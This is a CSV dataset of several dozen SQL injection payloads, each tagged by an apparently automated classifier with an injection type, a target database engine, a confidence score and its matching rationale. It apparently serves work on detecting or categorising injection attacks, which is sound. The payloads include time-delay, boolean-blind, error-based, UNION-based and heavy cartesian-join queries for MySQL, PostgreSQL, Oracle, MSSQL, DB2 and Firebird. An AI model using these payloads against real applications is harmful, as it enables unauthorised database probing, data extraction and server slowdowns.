id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
19085,1 ) and 2457 = 8146,boolean_blind,generic,0.80,"Token 'and 2457 = 8146' matched in payload '1 ) and 2457 = 8146' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); No exclusive DB signature → generic",3
19086,"1"" and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )",heavy_query,db2,0.90,"Token 'from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3' matched in payload '1"" and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables ' → heavy_query (P4, heavy compute / cartesian join); DB signature token 'sysibm.systables' → db2",1
19087,-9688%' ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( '%' = ',boolean_blind,generic,0.80,"Token 'case when ( 2724 = 2724 ) then char ( 49 ) else' matched in payload '-9688%' ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); No exclusive DB signature → generic",3
19088,select sleep ( 5 ) and ( ( ( 5552 = 5552,time_blind,mysql,0.90,"Token 'sleep (' matched in payload 'select sleep ( 5 ) and ( ( ( 5552 = 5552' → time_blind (P5, time delay function); DB signature token 'sleep (' → mysql",2
19089,"1 ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,0.95,"Token 'extractvalue' matched in payload '1 ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000' → error_based (P4, error-based XML/cast function); DB signature token 'extractvalue' → mysql; secondary signal 'benchmark (' (time_blind P5) overridden by priority",2
19090,"1%"" ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ""%"" = """,heavy_query,db2,0.90,"Token 'from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3' matched in payload '1%"" ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systable' → heavy_query (P4, heavy compute / cartesian join); DB signature token 'sysibm.systables' → db2",1
19091,"1'+ ( select lhtn where 8484 = 8484 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) +'",boolean_blind,generic,0.80,"Token 'where 8484 = 8484' matched in payload '1'+ ( select lhtn where 8484 = 8484 and char ( 111 ) ||char ( 77 ) ||char ( 121 ' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); No exclusive DB signature → generic",2
19092,select sleep ( 5 ) and ( ( ( 'rzjf' = 'rzjf,time_blind,mysql,0.90,"Token 'sleep (' matched in payload 'select sleep ( 5 ) and ( ( ( 'rzjf' = 'rzjf' → time_blind (P5, time delay function); DB signature token 'sleep (' → mysql",2
19093,select pg_sleep ( 5 ) and ( ( ( 'mgbm' like 'mgbm,time_blind,postgresql,0.90,"Token 'pg_sleep' matched in payload 'select pg_sleep ( 5 ) and ( ( ( 'mgbm' like 'mgbm' → time_blind (P5, time delay function); DB signature token 'pg_sleep' → postgresql",2
19094,"1"" ) ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",time_blind,mysql,0.90,"Token 'sleep (' matched in payload '1"" ) ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #' → time_blind (P5, time delay function); DB signature token 'sleep (' → mysql",2
19095,"1%' ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( '%' = '",heavy_query,postgresql,0.90,"Token 'generate_series' matched in payload '1%' ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ' → heavy_query (P4, heavy compute / cartesian join); DB signature token 'generate_series' → postgresql",3
19096,"select count ( * ) from generate_series ( 1,5000000 ) and ( ( ( 'ldqq' = 'ldqq",heavy_query,postgresql,0.90,"Token 'generate_series' matched in payload 'select count ( * ) from generate_series ( 1,5000000 ) and ( ( ( 'ldqq' = 'ldqq' → heavy_query (P4, heavy compute / cartesian join); DB signature token 'generate_series' → postgresql",3
19097,"1%"" and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ""%"" = """,heavy_query,generic,0.80,"Token 'from all_users t1,all_users t2,all_users t3' matched in payload '1%"" and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,' → heavy_query (P4, heavy compute / cartesian join); No exclusive DB signature → generic",1
19098,select ( case when ( 9393 = 5530 ) then 9393 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,boolean_blind,oracle,0.95,"Token 'case when ( 9393 = 5530 ) then 9393 else' matched in payload 'select ( case when ( 9393 = 5530 ) then 9393 else cast ( 1 as int ) / ( select 0' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'dual' → oracle; secondary signal 'cast ( 1 as int' (error_based P4) overridden by priority",3
19099,"1' ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( 'skdm' = 'skdm",boolean_blind,mysql,0.95,"Token 'elt (' matched in payload '1' ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 ' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'extractvalue' → mysql; secondary signal 'extractvalue' (error_based P4) overridden by priority",2
19100,"1%' ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( '%' = '",time_blind,oracle,0.90,"Token 'dbms_pipe.receive_message' matched in payload '1%' ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 11' → time_blind (P5, time delay function); DB signature token 'dbms_pipe' → oracle",3
19101,( select ( case when ( 6461 = 1802 ) then 1 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual ),boolean_blind,oracle,0.95,"Token 'case when ( 6461 = 1802 ) then 1 else' matched in payload '( select ( case when ( 6461 = 1802 ) then 1 else cast ( 1 as int ) / ( select 0 ' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'dual' → oracle; secondary signal 'cast ( 1 as int' (error_based P4) overridden by priority",3
19102,"1"" ) ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( ( ""ilge"" like ""ilge",boolean_blind,mysql,0.95,"Token 'elt (' matched in payload '1"" ) ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( ( ""ilge"" like ""ilge' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'elt' → mysql; secondary signal 'sleep (' (time_blind P5) overridden by priority",2
19103,-6518' ) ) as vocx where 2539 = 2539 or ( 8652 = 2025 ) *2025--,boolean_blind,generic,0.80,"Token 'or ( 8652 = 2025 )' matched in payload '-6518' ) ) as vocx where 2539 = 2539 or ( 8652 = 2025 ) *2025--' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); No exclusive DB signature → generic",3
19104,"1%"" and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",heavy_query,generic,0.80,"Token 'from all_users t1,all_users t2,all_users t3' matched in payload '1%"" and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,' → heavy_query (P4, heavy compute / cartesian join); No exclusive DB signature → generic",1
19105,"1%"" ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ""%"" = """,boolean_blind,mysql,0.95,"Token 'elt (' matched in payload '1%"" ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'elt' → mysql; secondary signal 'exp ( ~' (error_based P4) overridden by priority",2
19106,"1"" ) as fkco where 8877 = 8877 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",boolean_blind,mysql,0.90,"Token 'elt (' matched in payload '1"" ) as fkco where 8877 = 8877 or ( select 9173 from ( select count ( * ) ,conca' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'information_schema' → mysql",2
19107,"1"" ) ) and 5421 = 4804--",boolean_blind,generic,0.80,"Token 'and 5421 = 4804' matched in payload '1"" ) ) and 5421 = 4804--' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); No exclusive DB signature → generic",3
19108,"( select ( case when ( 3531 = 3531 ) then ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) else 3531 end ) )",boolean_blind,generic,0.80,"Token 'case when ( 3531 = 3531 ) then ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) else' matched in payload '( select ( case when ( 3531 = 3531 ) then ( select count ( * ) from sysusers as ' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); No exclusive DB signature → generic",3
19109,select ( case when ( 4205 = 9574 ) then 4205 else 1/ ( select 0 ) end ) --,boolean_blind,generic,0.80,"Token 'case when ( 4205 = 9574 ) then 4205 else' matched in payload 'select ( case when ( 4205 = 9574 ) then 4205 else 1/ ( select 0 ) end ) --' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); No exclusive DB signature → generic",3
19110,1' ) and ( 3020 = 3020 ) *6703 and ( 'rskq' = 'rskq,boolean_blind,generic,0.80,"Token 'and ( 3020 = 3020 )' matched in payload '1' ) and ( 3020 = 3020 ) *6703 and ( 'rskq' = 'rskq' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); No exclusive DB signature → generic",2
19111,"1 ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( 5200 = 5200",boolean_blind,generic,0.50,"UNCERTAIN: payload '1 ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sys' has SQL syntax but no priority-tagged signal (no UNION/SLEEP/XMLTYPE/ELT/RLIKE/WAITFOR matched). a_type=boolean_blind, c_type=boolean_blind.",3
19112,1' ) ) and 2832 = 4165--,boolean_blind,generic,0.80,"Token 'and 2832 = 4165' matched in payload '1' ) ) and 2832 = 4165--' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); No exclusive DB signature → generic",3
19113,1'+ ( select qpaf where 7859 = 7859 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) ) +',boolean_blind,mysql,0.95,"Token 'where 7859 = 7859' matched in payload '1'+ ( select qpaf where 7859 = 7859 or ( select * from ( select ( sleep ( 5 ) ) ' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'sleep (' → mysql; secondary signal 'sleep (' (time_blind P5) overridden by priority",2
19114,"1' ) ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( ( ( 'cenk' = 'cenk",boolean_blind,generic,0.50,"UNCERTAIN: payload '1' ) ) ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_s' has SQL syntax but no priority-tagged signal (no UNION/SLEEP/XMLTYPE/ELT/RLIKE/WAITFOR matched). a_type=boolean_blind, c_type=heavy_query.",2
19115,select pg_sleep ( 5 ) and ( ( 'vxxg' = 'vxxg,time_blind,postgresql,0.90,"Token 'pg_sleep' matched in payload 'select pg_sleep ( 5 ) and ( ( 'vxxg' = 'vxxg' → time_blind (P5, time delay function); DB signature token 'pg_sleep' → postgresql",2
19116,"1'+ ( select 'drvv' where 5622 = 5622 and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,generic,0.85,"Token 'where 5622 = 5622' matched in payload '1'+ ( select 'drvv' where 5622 = 5622 and 3580 = ( select count ( * ) from domai' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); No exclusive DB signature → generic; secondary signal 'from domain.domains as t1,domain.columns as t2,domain.tables as t3' (heavy_query P4) overridden by priority",3
19117,"1"" ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",time_blind,postgresql,0.90,"Token 'pg_sleep' matched in payload '1"" ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --' → time_blind (P5, time delay function); DB signature token 'pg_sleep' → postgresql",2
19118,"-3628"" or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) )",boolean_blind,mssql,0.95,"Token 'case when ( 1570 = 1570 ) then char ( 49 ) else' matched in payload '-3628"" or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'convert (' → mssql; secondary signal 'convert ( int,' (error_based P4) overridden by priority",3
19119,"1"" ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ""nnmz"" like ""nnmz",heavy_query,generic,0.80,"Token 'from all_users t1,all_users t2,all_users t3' matched in payload '1"" ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,' → heavy_query (P4, heavy compute / cartesian join); No exclusive DB signature → generic",1
19120,"1' ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )",boolean_blind,mysql,0.95,"Token 'elt (' matched in payload '1' ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( sele' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'elt' → mysql; secondary signal 'union select' (union_based P7) overridden by priority",2
19121,"1'+ ( select 'nmhy' where 2919 = 2919 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",boolean_blind,db2,0.95,"Token 'where 2919 = 2919' matched in payload '1'+ ( select 'nmhy' where 2919 = 2919 and 8189 = ( select count ( * ) from sysib' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'sysibm.systables' → db2; secondary signal 'from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3' (heavy_query P4) overridden by priority",3
19122,"1%"" ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.90,"Token 'from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3' matched in payload '1%"" ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systabl' → heavy_query (P4, heavy compute / cartesian join); DB signature token 'sysibm.systables' → db2",1
19123,"1%' ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ( '%' = '",boolean_blind,mysql,0.95,"Token 'elt (' matched in payload '1%' ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ( '%' = '' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'elt' → mysql; secondary signal 'sleep (' (time_blind P5) overridden by priority",2
19124,"1 ) where 8164 = 8164 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,firebird,0.90,"Token 'where 8164 = 8164' matched in payload '1 ) where 8164 = 8164 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$t' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'rdb$' → firebird",3
19125,1' ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 'nxkp' like 'nxkp,boolean_blind,oracle,0.90,"Token 'case when ( 7756 = 7756 ) then 1 else' matched in payload '1' ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||ch' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'dual' → oracle",3
19126,"1' ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( 'miba' = 'miba",heavy_query,generic,0.80,"Token 'from domain.domains as t1,domain.columns as t2,domain.tables as t3' matched in payload '1' ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns ' → heavy_query (P4, heavy compute / cartesian join); No exclusive DB signature → generic",1
19127,"1"" or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ""vwep"" like ""vwep",heavy_query,generic,0.80,"Token 'from domain.domains as t1,domain.columns as t2,domain.tables as t3' matched in payload '1"" or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2' → heavy_query (P4, heavy compute / cartesian join); No exclusive DB signature → generic",1
19128,1%' ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,boolean_blind,mysql,0.95,"Token 'rlike (' matched in payload '1%' ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'rlike' → mysql; secondary signal 'sleep (' (time_blind P5) overridden by priority",3
19129,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ( 'qvoy' = 'qvoy",heavy_query,generic,0.80,"Token 'from all_users t1,all_users t2,all_users t3' matched in payload 'select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_' → heavy_query (P4, heavy compute / cartesian join); No exclusive DB signature → generic",1
19130,1'+ ( select 'rajp' where 3300 = 3300,boolean_blind,generic,0.80,"Token 'where 3300 = 3300' matched in payload '1'+ ( select 'rajp' where 3300 = 3300' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); No exclusive DB signature → generic",3
19131,"1%' ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( '%' = '",boolean_blind,mysql,0.90,"Token 'elt (' matched in payload '1%' ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71,' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'elt' → mysql",2
19132,"1"" ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ""thkh"" like ""thkh",boolean_blind,mysql,0.95,"Token 'elt (' matched in payload '1"" ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 =' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'extractvalue' → mysql; secondary signal 'extractvalue' (error_based P4) overridden by priority",2
19133,"1 ) ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,firebird,0.50,"UNCERTAIN: payload '1 ) ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$' has SQL syntax but no priority-tagged signal (no UNION/SLEEP/XMLTYPE/ELT/RLIKE/WAITFOR matched). a_type=boolean_blind, c_type=boolean_blind.",3
19134,-1760 ) ) ) or ( 8459 = 8459 ) *4906 and ( ( ( 1541 = 1541,boolean_blind,generic,0.80,"Token 'or ( 8459 = 8459 )' matched in payload '-1760 ) ) ) or ( 8459 = 8459 ) *4906 and ( ( ( 1541 = 1541' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); No exclusive DB signature → generic",2
19135,"-5819%"" ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ""%"" = """,boolean_blind,oracle,0.95,"Token 'case when ( 4144 = 4144 ) then 1 else' matched in payload '-5819%"" ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr (' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); DB signature token 'xmltype' → oracle; secondary signal 'xmltype' (error_based P4) overridden by priority",2
19136,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) ) ||'",benign,generic,0.50,"UNCERTAIN: payload 'call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )' has SQL syntax but no priority-tagged signal (no UNION/SLEEP/XMLTYPE/ELT/RLIKE/WAITFOR matched). a_type=benign, c_type=heavy_query.",2
19137,"1"" where 3692 = 3692 union all select null,null--",boolean_blind,generic,0.85,"Token 'where 3692 = 3692' matched in payload '1"" where 3692 = 3692 union all select null,null--' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); No exclusive DB signature → generic; secondary signal 'union all select' (union_based P7) overridden by priority",1
19138,1 ) ) as uqsi where 1644 = 1644 and 9198 = 9198--,boolean_blind,generic,0.80,"Token 'and 9198 = 9198' matched in payload '1 ) ) as uqsi where 1644 = 1644 and 9198 = 9198--' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); No exclusive DB signature → generic",3
19139,"-2423' ) ) ) union all select 8256,8256,8256,8256,8256,8256,8256,8256--",union_based,generic,0.80,"Token 'union all select' matched in payload '-2423' ) ) ) union all select 8256,8256,8256,8256,8256,8256,8256,8256--' → union_based (P7, UNION SELECT); No exclusive DB signature → generic",3
19140,select ( case when ( 2717 = 2634 ) then 2717 else 2717* ( select 2717 from mysql.db ) end ) #,boolean_blind,generic,0.80,"Token 'case when ( 2717 = 2634 ) then 2717 else' matched in payload 'select ( case when ( 2717 = 2634 ) then 2717 else 2717* ( select 2717 from mysql' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); No exclusive DB signature → generic",3
19141,"-5539"" ) union all select 6189,6189,6189,6189,6189,6189,6189,6189,6189--",union_based,generic,0.80,"Token 'union all select' matched in payload '-5539"" ) union all select 6189,6189,6189,6189,6189,6189,6189,6189,6189--' → union_based (P7, UNION SELECT); No exclusive DB signature → generic",3
19142,1%' ) ) and sleep ( 5 ) #,time_blind,mysql,0.90,"Token 'sleep (' matched in payload '1%' ) ) and sleep ( 5 ) #' → time_blind (P5, time delay function); DB signature token 'sleep (' → mysql",2
19143,"-3790"" ) as ojgb where 5925 = 5925 union all select 5925,5925#",boolean_blind,generic,0.85,"Token 'where 5925 = 5925' matched in payload '-3790"" ) as ojgb where 5925 = 5925 union all select 5925,5925#' → boolean_blind (P3, boolean tautology / RLIKE/ELT/IF/CASE); No exclusive DB signature → generic; secondary signal 'union all select' (union_based P7) overridden by priority",1
